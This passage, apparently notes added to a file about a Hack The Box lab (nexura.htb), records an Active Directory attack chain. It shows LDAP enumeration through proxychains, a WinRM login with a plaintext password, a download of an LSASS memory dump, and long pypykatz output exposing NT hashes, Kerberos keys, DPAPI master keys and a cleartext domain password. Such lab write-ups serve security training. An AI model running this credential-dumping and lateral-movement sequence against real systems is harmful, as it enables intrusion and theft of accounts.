+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:389  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:389  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:636  ...  OK
+LDAP        172.16.119.11   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:nexura.htb) (signing:None) (channel binding:No TLS cert) 
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:389  ...  OK
+LDAP        172.16.119.11   389    DC01             [+] nexura.htb\bdavid:caramel-cigars-reply1 
+LDAP        172.16.119.11   389    DC01             Resolved collection methods: acl, adcs, container, dcom, group, localadmin, loggedon, objectprops, psremote, rdp, session, trusts
+LDAP        172.16.119.11   389    DC01             Excluded collection methods: 
+LDAP        172.16.119.11   389    DC01             [-] Bloodhound-python failed to resolve domain information, try specifying the DNS server.
+
+
+```
+
+```bash
+nxc winrm 172.16.119.7 -u bdavid -p 'caramel-cigars-reply1'
+WINRM       172.16.119.7    5985   JUMP01           [*] Windows 10 / Server 2019 Build 17763 (name:JUMP01) (domain:nexura.htb) 
+WINRM       172.16.119.7    5985   JUMP01           [+] nexura.htb\bdavid:caramel-cigars-reply1 (Pwn3d!)
+
+evil-winrm -i 172.16.119.7 -u bdavid -p 'caramel-cigars-reply1'
+cd C:\Windows\Temp
+download lsass.dmp /home/mapacheroja22/lsass.dmp
+
+source venv/bin/activate
+❯ pypykatz lsa minidump /home/mapacheroja22/lsass.dmp
+INFO:pypykatz:Parsing file /home/mapacheroja22/lsass.dmp
+FILE: ======== /home/mapacheroja22/lsass.dmp =======
+== LogonSession ==
+authentication_id 1303282 (13e2f2)
+session_id 0
+username bdavid
+domainname NEXURA
+logon_server DC01
+logon_time 2026-07-29T12:55:40.551418+00:00
+sid S-1-5-21-1333759777-277832620-2286231135-1105
+luid 1303282
+
+== LogonSession ==
+authentication_id 1237551 (12e22f)
+session_id 0
+username bdavid
+domainname NEXURA
+logon_server DC01
+logon_time 2026-07-29T12:50:09.729700+00:00
+sid S-1-5-21-1333759777-277832620-2286231135-1105
+luid 1237551
+
+== LogonSession ==
+authentication_id 267098 (4135a)
+session_id 2
+username stom
+domainname NEXURA
+logon_server DC01
+logon_time 2026-07-29T12:38:16.169416+00:00
+sid S-1-5-21-1333759777-277832620-2286231135-1106
+luid 267098
+	== MSV ==
+		Username: stom
+		Domain: NEXURA
+		LM: NA
+		NT: 21ea958524cfd9a7791737f8d2f764fa
+		SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
+		DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
+	== WDIGEST [4135a]==
+		username stom
+		domainname NEXURA
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: stom
+		Domain: NEXURA.HTB
+		AES128 Key: 21ea958524cfd9a7791737f8d2f764fa
+		AES256 Key: 63486142af3957430832a4bdcc9e984ef4e397cf6c78a7bb5ab9adfb07ce22da
+	== WDIGEST [4135a]==
+		username stom
+		domainname NEXURA
+		password None
+		password (hex)
+	== DPAPI [4135a]==
+		luid 267098
+		key_guid 33fbd25b-2488-49ef-9fa2-7a96959acb95
+		masterkey 0528dd7d0cfa8ca48e12bf937ab2dcd92fa588f958716a9abc6fa49444b9d580a0ab3d8f7657e4a4d327fe7df824c112ec8a3d04c22f8050e669c8f256983cda
+		sha1_masterkey 1cf754450d3c0515af105fd64ef952f9486495fb
+
+== LogonSession ==
+authentication_id 267016 (41308)
+session_id 2
+username stom
+domainname NEXURA
+logon_server DC01
+logon_time 2026-07-29T12:38:16.169416+00:00
+sid S-1-5-21-1333759777-277832620-2286231135-1106
+luid 267016
+	== MSV ==
+		Username: stom
+		Domain: NEXURA
+		LM: NA
+		NT: 21ea958524cfd9a7791737f8d2f764fa
+		SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
+		DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
+	== WDIGEST [41308]==
+		username stom
+		domainname NEXURA
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: stom
+		Domain: NEXURA.HTB
+		AES128 Key: 21ea958524cfd9a7791737f8d2f764fa
+		AES256 Key: 63486142af3957430832a4bdcc9e984ef4e397cf6c78a7bb5ab9adfb07ce22da
+	== WDIGEST [41308]==
+		username stom
+		domainname NEXURA
+		password None
+		password (hex)
+
+== LogonSession ==
+authentication_id 69274 (10e9a)
+session_id 1
+username DWM-1
+domainname Window Manager
+logon_server 
+logon_time 2026-07-29T12:37:16.875109+00:00
+sid S-1-5-90-0-1
+luid 69274
+	== MSV ==
+		Username: JUMP01$
+		Domain: NEXURA
+		LM: NA
+		NT: 7bef0ee0b472d2c5805921324525f321
+		SHA1: 6158a1877c4157ed624eb5c4d717e237525bbef1
+		DPAPI: 0000000000000000000000000000000000000000
+	== WDIGEST [10e9a]==
+		username JUMP01$
+		domainname NEXURA
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: JUMP01$
+		Domain: nexura.htb
+		Password: 333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
+		password (hex)333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
+		AES128 Key: 7bef0ee0b472d2c5805921324525f321
+		AES256 Key: ff3bf7975dbcbe960805376e92c0a68e98071d51d007077a8f74297ebe6c9389
+	== WDIGEST [10e9a]==
+		username JUMP01$
+		domainname NEXURA
+		password None
+		password (hex)
+
+== LogonSession ==
+authentication_id 69256 (10e88)
+session_id 1
+username DWM-1
+domainname Window Manager
+logon_server 
+logon_time 2026-07-29T12:37:16.875109+00:00
+sid S-1-5-90-0-1
+luid 69256
+	== MSV ==
+		Username: JUMP01$
+		Domain: NEXURA
+		LM: NA
+		NT: 59617b5619cae6c3c8e7091c9dc420d5
+		SHA1: 3e7be663646925c45e12656415fbe7276c3c2e90
+		DPAPI: 0000000000000000000000000000000000000000
+	== WDIGEST [10e88]==
+		username JUMP01$
+		domainname NEXURA
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: JUMP01$
+		Domain: nexura.htb
+		Password: d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
+		password (hex)d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
+		AES128 Key: 59617b5619cae6c3c8e7091c9dc420d5
+		AES256 Key: 4cf483f5413a94f126892d632a2681ec02c4227d582be44bc3ade6a4998a35d2
+	== WDIGEST [10e88]==
+		username JUMP01$
+		domainname NEXURA
+		password None
+		password (hex)
+
+== LogonSession ==
+authentication_id 996 (3e4)
+session_id 0
+username JUMP01$
+domainname NEXURA
+logon_server 
+logon_time 2026-07-29T12:37:16.625102+00:00
+sid S-1-5-20
+luid 996
+	== MSV ==
+		Username: JUMP01$
+		Domain: NEXURA
+		LM: NA
+		NT: 59617b5619cae6c3c8e7091c9dc420d5
+		SHA1: 3e7be663646925c45e12656415fbe7276c3c2e90
+		DPAPI: 0000000000000000000000000000000000000000
+	== WDIGEST [3e4]==
+		username JUMP01$
+		domainname NEXURA
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: jump01$
+		Domain: NEXURA.HTB
+		Password: d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
+		password (hex)d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
+		AES128 Key: 59617b5619cae6c3c8e7091c9dc420d5
+		AES256 Key: a29da7a1589920df1dbad256f50f8ff494b6da328f8779521c1b1219f2067999
+	== WDIGEST [3e4]==
+		username JUMP01$
+		domainname NEXURA
+		password None
+		password (hex)
+
+== LogonSession ==
+authentication_id 39663 (9aef)
+session_id 1
+username UMFD-1
+domainname Font Driver Host
+logon_server 
+logon_time 2026-07-29T12:37:16.453229+00:00
+sid S-1-5-96-0-1
+luid 39663
+	== MSV ==
+		Username: JUMP01$
+		Domain: NEXURA
+		LM: NA
+		NT: 59617b5619cae6c3c8e7091c9dc420d5
+		SHA1: 3e7be663646925c45e12656415fbe7276c3c2e90
+		DPAPI: 0000000000000000000000000000000000000000
+	== WDIGEST [9aef]==
+		username JUMP01$
+		domainname NEXURA
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: JUMP01$
+		Domain: nexura.htb
+		Password: d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
+		password (hex)d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
+		AES128 Key: 59617b5619cae6c3c8e7091c9dc420d5
+		AES256 Key: 4cf483f5413a94f126892d632a2681ec02c4227d582be44bc3ade6a4998a35d2
+	== WDIGEST [9aef]==
+		username JUMP01$
+		domainname NEXURA
+		password None
+		password (hex)
+
+== LogonSession ==
+authentication_id 39649 (9ae1)
+session_id 0
+username UMFD-0
+domainname Font Driver Host
+logon_server 
+logon_time 2026-07-29T12:37:16.453229+00:00
+sid S-1-5-96-0-0
+luid 39649
+	== MSV ==
+		Username: JUMP01$
+		Domain: NEXURA
+		LM: NA
+		NT: 59617b5619cae6c3c8e7091c9dc420d5
+		SHA1: 3e7be663646925c45e12656415fbe7276c3c2e90
+		DPAPI: 0000000000000000000000000000000000000000
+	== WDIGEST [9ae1]==
+		username JUMP01$
+		domainname NEXURA
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: JUMP01$
+		Domain: nexura.htb
+		Password: d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
+		password (hex)d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
+		AES128 Key: 59617b5619cae6c3c8e7091c9dc420d5
+		AES256 Key: 4cf483f5413a94f126892d632a2681ec02c4227d582be44bc3ade6a4998a35d2
+	== WDIGEST [9ae1]==
+		username JUMP01$
+		domainname NEXURA
+		password None
+		password (hex)
+
+== LogonSession ==
+authentication_id 38736 (9750)
+session_id 0
+username 
+domainname 
+logon_server 
+logon_time 2026-07-29T12:37:16.156354+00:00
+sid None
+luid 38736
+	== MSV ==
+		Username: JUMP01$
+		Domain: NEXURA
+		LM: NA
+		NT: 59617b5619cae6c3c8e7091c9dc420d5
+		SHA1: 3e7be663646925c45e12656415fbe7276c3c2e90
+		DPAPI: 0000000000000000000000000000000000000000
+
+== LogonSession ==
+authentication_id 1244712 (12fe28)
+session_id 0
+username bdavid
+domainname NEXURA
+logon_server DC01
+logon_time 2026-07-29T12:50:59.089069+00:00
+sid S-1-5-21-1333759777-277832620-2286231135-1105
+luid 1244712
+
+== LogonSession ==
+authentication_id 246875 (3c45b)
+session_id 2
+username DWM-2
+domainname Window Manager
+logon_server 
+logon_time 2026-07-29T12:38:15.619864+00:00
+sid S-1-5-90-0-2
+luid 246875
+	== MSV ==
+		Username: JUMP01$
+		Domain: NEXURA
+		LM: NA
+		NT: 7bef0ee0b472d2c5805921324525f321
+		SHA1: 6158a1877c4157ed624eb5c4d717e237525bbef1
+		DPAPI: 0000000000000000000000000000000000000000
+	== WDIGEST [3c45b]==
+		username JUMP01$
+		domainname NEXURA
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: JUMP01$
+		Domain: nexura.htb
+		Password: 333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
+		password (hex)333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
+		AES128 Key: 7bef0ee0b472d2c5805921324525f321
+		AES256 Key: ff3bf7975dbcbe960805376e92c0a68e98071d51d007077a8f74297ebe6c9389
+	== WDIGEST [3c45b]==
+		username JUMP01$
+		domainname NEXURA
+		password None
+		password (hex)
+
+== LogonSession ==
+authentication_id 246809 (3c419)
+session_id 2
+username DWM-2
+domainname Window Manager
+logon_server 
+logon_time 2026-07-29T12:38:15.618863+00:00
+sid S-1-5-90-0-2
+luid 246809
+	== MSV ==
+		Username: JUMP01$
+		Domain: NEXURA
+		LM: NA
+		NT: 59617b5619cae6c3c8e7091c9dc420d5
+		SHA1: 3e7be663646925c45e12656415fbe7276c3c2e90
+		DPAPI: 0000000000000000000000000000000000000000
+	== WDIGEST [3c419]==
+		username JUMP01$
+		domainname NEXURA
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: JUMP01$
+		Domain: nexura.htb
+		Password: d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
+		password (hex)d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
+		AES128 Key: 59617b5619cae6c3c8e7091c9dc420d5
+		AES256 Key: 4cf483f5413a94f126892d632a2681ec02c4227d582be44bc3ade6a4998a35d2
+	== WDIGEST [3c419]==
+		username JUMP01$
+		domainname NEXURA
+		password None
+		password (hex)
+
+== LogonSession ==
+authentication_id 246040 (3c118)
+session_id 2
+username UMFD-2
+domainname Font Driver Host
+logon_server 
+logon_time 2026-07-29T12:38:15.596862+00:00
+sid S-1-5-96-0-2
+luid 246040
+	== MSV ==
+		Username: JUMP01$
+		Domain: NEXURA
+		LM: NA
+		NT: 59617b5619cae6c3c8e7091c9dc420d5
+		SHA1: 3e7be663646925c45e12656415fbe7276c3c2e90
+		DPAPI: 0000000000000000000000000000000000000000
+	== WDIGEST [3c118]==
+		username JUMP01$
+		domainname NEXURA
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: JUMP01$
+		Domain: nexura.htb
+		Password: d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
+		password (hex)d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
+		AES128 Key: 59617b5619cae6c3c8e7091c9dc420d5
+		AES256 Key: 4cf483f5413a94f126892d632a2681ec02c4227d582be44bc3ade6a4998a35d2
+	== WDIGEST [3c118]==
+		username JUMP01$
+		domainname NEXURA
+		password None
+		password (hex)
+
+== LogonSession ==
+authentication_id 223331 (36863)
+session_id 0
+username stom
+domainname NEXURA
+logon_server DC01
+logon_time 2026-07-29T12:37:49.031359+00:00
+sid S-1-5-21-1333759777-277832620-2286231135-1106
+luid 223331
+	== MSV ==
+		Username: stom
+		Domain: NEXURA
+		LM: NA
+		NT: 21ea958524cfd9a7791737f8d2f764fa
+		SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
+		DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
+	== WDIGEST [36863]==
+		username stom
+		domainname NEXURA
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: stom
+		Domain: NEXURA.HTB
+		Password: calves-warp-learning1
+		password (hex)630061006c007600650073002d0077006100720070002d006c006500610072006e0069006e0067003100000000000000
+		AES128 Key: 21ea958524cfd9a7791737f8d2f764fa
+		AES256 Key: 63486142af3957430832a4bdcc9e984ef4e397cf6c78a7bb5ab9adfb07ce22da
+	== WDIGEST [36863]==
+		username stom
+		domainname NEXURA
+		password None
+		password (hex)
+
+== LogonSession ==
+authentication_id 997 (3e5)
+session_id 0
+username LOCAL SERVICE
+domainname NT AUTHORITY
+logon_server 
+logon_time 2026-07-29T12:37:16.968850+00:00
+sid S-1-5-19
+luid 997
+	== Kerberos ==
+		Username: 
+		Domain: 
+
+== LogonSession ==
+authentication_id 999 (3e7)
+session_id 0
+username JUMP01$
+domainname NEXURA
+logon_server 
+logon_time 2026-07-29T12:37:16.078228+00:00
+sid S-1-5-18
+luid 999
+	== WDIGEST [3e7]==
+		username JUMP01$
+		domainname NEXURA
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: jump01$
+		Domain: NEXURA.HTB
+		Password: d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
+		password (hex)d42deb8b29eb410a747937b0fb0a6d89889bfe6afe8d0ea46e8c6b859daa9ff6a97f6604229ca08f241904f4eee5f518189f3e1893b04a64a7dbaed07309bff63b4eebd105eaeeb7fa07a52058cf7ae3301b5ac6cdd73b7e22fd9d3422b3cf3200fed0073afc29acbac8d7a272620d3460539846b45138d6cf5673da4837397bf9da1372d30df7e557969901530f87236ead7f6fa4881749229fa0b8097a24234f5ad98a31e6e25551aeb2baa9febb567a4593a019a57facb6d82354ae5112a760bb4246118a26a25d55585b63a66410dd17b2464a8c6fc24e49d6eda91f7939f19a76202648e7574230d857a5b22f57
+		AES128 Key: 59617b5619cae6c3c8e7091c9dc420d5
+		AES256 Key: a29da7a1589920df1dbad256f50f8ff494b6da328f8779521c1b1219f2067999
+	== WDIGEST [3e7]==
+		username JUMP01$
+		domainname NEXURA
+		password None
+		password (hex)
+	== DPAPI [3e7]==
+		luid 999
+		key_guid 6f898230-c272-4f85-875c-9f7b354ce485
+		masterkey 515312a4b821ede8f2d839db59ca683d55f8a3a22568d80639e2dd4f6986a4b5dc8ec78bdd54aa643c3856fbb2602301c05f37c763bce3dca8addd70b9709018
+		sha1_masterkey a72bb2f3d888269936f60a4deb2ea5fc9382ddfc
+	== DPAPI [3e7]==
+		luid 999
+		key_guid 3a53c4b6-0506-4d3b-a664-363a85cddee3
+		masterkey 7d55efdee4ad5836fb89d0927ba0eded11365311083eb93765502b3c627faa9cd65f3b3f119a1c99f8fe84e6f9fdc262c27aca20a5f858ec6963ce20e1192af5
+		sha1_masterkey 3f23a732b260cc0f8189960ccc22c4f4e720c8d0
+	== DPAPI [3e7]==
+		luid 999
+		key_guid 60dddcd7-ae2a-4d56-9015-8c9610d22f1c
+		masterkey 559fac54ce814e726cfc905112283d3dd9b6952573553fccba02fb183fb1df4c3ea9d42f1ed8d82b59a38600c1c16bc620795c2f9d99e3d7d97cd748f00a84e2
+		sha1_masterkey c924316a1562430664979e3b0f6b35cfac1df0c1
+	== DPAPI [3e7]==
+		luid 999
+		key_guid a3e4e62a-dabd-46af-ad98-19e980bfcacc
+		masterkey bf2d5ec8e50a7a1f39a95b285b89c34801f9fc20e4de040be484dd9e9e0da541103d9d52a4262cca2c56c42d6a6623a4c3688d11eead456d29ba4232b1d56ad6
+		sha1_masterkey deafb3b197371274c7968d7fd84264210e124102
+	== DPAPI [3e7]==
+		luid 999
+		key_guid a81a2dcc-bfc1-4647-b0a7-abb508a6e7df
+		masterkey 0de9f713c2a2c3490faf703ceb57c458020429170615bca60b87519ce8eb5711732d444211b71e80aa9ac379ef6ba0aea33c3a6ebd92860cb6b20ff1bc9a0ac7
+		sha1_masterkey 59cee312e149c59e836474079479757ac7e3842c
+	== DPAPI [3e7]==
+		luid 999
+		key_guid 9ccbb5e8-66c9-4210-a46c-a72e8f750734
+		masterkey cb6dd3fe4b3f3a6afa0520d84b39539205139ebd81b68c49aef5c365d975920331c43fb06990aa3ef8c07860fdda33100d3b4cdf259d02cc02a3114ecf6e7721
+		sha1_masterkey a0c3d07ffb66b9d1d3a9e02237d56fde0fc217d1
+
+pypykatz lsa minidump /home/mapacheroja22/lsass.dmp | grep -iA 20 stom
+INFO:pypykatz:Parsing file /home/mapacheroja22/lsass.dmp
+username stom
+domainname NEXURA
+logon_server DC01
+logon_time 2026-07-29T12:38:16.169416+00:00
+sid S-1-5-21-1333759777-277832620-2286231135-1106
+luid 267098
+	== MSV ==
+		Username: stom
+		Domain: NEXURA
+		LM: NA
+		NT: 21ea958524cfd9a7791737f8d2f764fa
+		SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
+		DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
+	== WDIGEST [4135a]==
+		username stom
+		domainname NEXURA
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: stom
+		Domain: NEXURA.HTB
+		AES128 Key: 21ea958524cfd9a7791737f8d2f764fa
+		AES256 Key: 63486142af3957430832a4bdcc9e984ef4e397cf6c78a7bb5ab9adfb07ce22da
+	== WDIGEST [4135a]==
+		username stom
+		domainname NEXURA
+		password None
+		password (hex)
+	== DPAPI [4135a]==
+		luid 267098
+		key_guid 33fbd25b-2488-49ef-9fa2-7a96959acb95
+		masterkey 0528dd7d0cfa8ca48e12bf937ab2dcd92fa588f958716a9abc6fa49444b9d580a0ab3d8f7657e4a4d327fe7df824c112ec8a3d04c22f8050e669c8f256983cda
+		sha1_masterkey 1cf754450d3c0515af105fd64ef952f9486495fb
+
+== LogonSession ==
+authentication_id 267016 (41308)
+session_id 2
+username stom
+domainname NEXURA
+logon_server DC01
+logon_time 2026-07-29T12:38:16.169416+00:00
+sid S-1-5-21-1333759777-277832620-2286231135-1106
+luid 267016
+	== MSV ==
+		Username: stom
+		Domain: NEXURA
+		LM: NA
+		NT: 21ea958524cfd9a7791737f8d2f764fa
+		SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
+		DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
+	== WDIGEST [41308]==
+		username stom
+		domainname NEXURA
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: stom
+		Domain: NEXURA.HTB
+		AES128 Key: 21ea958524cfd9a7791737f8d2f764fa
